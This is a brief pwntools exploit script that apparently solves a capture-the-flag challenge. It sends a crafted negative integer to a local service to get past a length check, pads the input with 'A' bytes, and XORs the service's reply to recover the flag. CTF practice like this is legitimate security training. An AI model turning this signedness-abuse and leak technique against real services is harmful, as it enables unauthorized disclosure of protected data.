from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

#r = process('./container/chall')
r = remote('localhost', 50000)
#gdb.attach(r, """c""")

r.sendline(str((-1<<31)+1).encode())
r.sendline(b"A"*0xff)
r.recvuntil(b"Result: ")
res = r.recvline().strip()
flag = xor(b"A"*0xff, res)
print(flag)
#r.interactive()